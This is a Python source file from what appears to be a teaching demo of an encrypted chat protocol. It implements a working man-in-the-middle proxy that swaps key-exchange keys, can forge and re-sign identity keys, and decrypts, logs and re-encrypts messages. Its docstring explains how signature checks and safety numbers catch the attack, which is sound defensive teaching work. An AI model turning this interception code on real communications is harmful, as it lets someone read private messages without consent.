"""
mitm_proxy.py - ATTACK 1: man-in-the-middle on the key exchange
-----------------------------------------------------------------
The attacker sits between the clients and the server and swaps the ephemeral
X25519 keys, so it ends up with TWO sessions:

    alice  <== keys K1 ==>  ATTACKER  <== keys K2 ==>  bob

It can then decrypt every message, read it, re-encrypt it and pass it on.
Neither side notices... unless the key exchange is AUTHENTICATED.

Modes:
    (default)          swap only the ephemeral keys, keep alice's real signature
                       -> secure clients: signature check fails -> SIG_FAIL, refused
                       -> --insecure clients: attack WORKS, proxy prints every message
    --forge-identity   also replace the identity key with the attacker's own and re-sign
                       -> first-ever contact: handshake succeeds, BUT the safety numbers
                          on alice's and bob's screens are DIFFERENT (that's how you catch it)
                       -> if alice and bob had talked before: IDENTITY_CHANGED, refused

Run (server + clients with --no-tls, clients pointing at port 9100):
    python -m attacks.mitm_proxy --listen 9100 --server-port 9000
    python -m attacks.mitm_proxy --forge-identity
"""

from cryptography.exceptions import InvalidTag

from attacks.proxy_base import GREEN, RED, YELLOW, AttackProxy, common_args, run, say
from client.session import Session
from common import crypto_utils
from common.envelope import b64decode, b64encode
from common.handshake import init_transcript, resp_transcript
from common.packet import PacketError, build_packet, open_packet


class MitmProxy(AttackProxy):
    name = "MITM"

    def __init__(self, *args, forge_identity=False):
        super().__init__(*args)
        self.forge_identity = forge_identity
        # The attacker's own identity key (used only with --forge-identity).
        self.attacker_identity, self.attacker_identity_pub = crypto_utils.generate_identity_keypair()
        # (initiator, responder) -> the two sessions the attacker holds
        self.pairs = {}

    async def on_client_frame(self, conn, envelope):
        kind = envelope.get("type")
        sender, target = conn.username, envelope.get("to")

        # ---------------- KEY_INIT: alice -> bob ----------------
        if kind == "KEY_INIT":
            alice_eph = b64decode(envelope["pub"])
            with_alice = Session(sender, is_initiator=False)   # attacker pretends to be bob
            with_alice.complete(alice_eph)
            with_bob = Session(target, is_initiator=True)       # attacker pretends to be alice
            self.pairs[(sender, target)] = {"with_alice": with_alice, "with_bob": with_bob,
                                            "alice_eph": alice_eph}

            envelope["pub"] = b64encode(with_bob.my_public)     # bob gets the ATTACKER's key
            if self.forge_identity:
                envelope["id_pub"] = b64encode(self.attacker_identity_pub)
                envelope["sig"] = b64encode(crypto_utils.sign(
                    self.attacker_identity, init_transcript(sender, target, with_bob.my_public)))
                say(RED, f"[MITM] KEY_INIT {sender}->{target}: swapped ephemeral key AND identity, re-signed")
            else:
                say(RED, f"[MITM] KEY_INIT {sender}->{target}: swapped ephemeral key "
                         f"(kept {sender}'s original signature)")
            return [envelope]

        # ---------------- KEY_RESP: bob -> alice ----------------
        if kind == "KEY_RESP" and (target, sender) in self.pairs:
            pair = self.pairs[(target, sender)]
            pair["with_bob"].complete(b64decode(envelope["pub"]))
            envelope["pub"] = b64encode(pair["with_alice"].my_public)
            if self.forge_identity:
                envelope["id_pub"] = b64encode(self.attacker_identity_pub)
                envelope["sig"] = b64encode(crypto_utils.sign(
                    self.attacker_identity,
                    resp_transcript(target, sender, pair["alice_eph"], pair["with_alice"].my_public)))
            say(RED, f"[MITM] KEY_RESP {sender}->{target}: swapped. Attacker now holds both session keys.")
            return [envelope]

        # ---------------- CHAT: decrypt, read, re-encrypt ----------------
        if kind == "CHAT":
            if (sender, target) in self.pairs:          # from the initiator
                pair = self.pairs[(sender, target)]
                inbound, outbound = pair["with_alice"], pair["with_bob"]
            elif (target, sender) in self.pairs:        # from the responder
                pair = self.pairs[(target, sender)]
                inbound, outbound = pair["with_bob"], pair["with_alice"]
            else:
                return [envelope]

            packet = b64decode(envelope["packet"])
            try:
                msg_type, _seq, plaintext = open_packet(inbound.recv_key, packet)       # AES-GCM
                ctr = False
            except (InvalidTag, PacketError):
                # Not AES-GCM -> the clients are in --insecure mode (AES-CTR).
                msg_type, _seq, plaintext = open_packet(inbound.recv_key, packet, insecure=True)
                ctr = True

            say(GREEN, f"[MITM] INTERCEPTED {sender} -> {target}: {plaintext.decode(errors='replace')!r}")
            new_packet = build_packet(msg_type, outbound.send_seq, outbound.send_key, plaintext,
                                      insecure=ctr)
            outbound.send_seq += 1
            envelope["packet"] = b64encode(new_packet)
            return [envelope]

        return [envelope]


def main():
    parser = common_args("MITM attack proxy (demo only)")
    parser.add_argument("--forge-identity", action="store_true",
                        help="also replace identity keys with the attacker's own")
    args = parser.parse_args()
    say(YELLOW, "[MITM] Start server and clients with --no-tls; point clients at the proxy port.")
    run(MitmProxy(args.listen, args.server_host, args.server_port,
                  forge_identity=args.forge_identity))


if __name__ == "__main__":
    main()
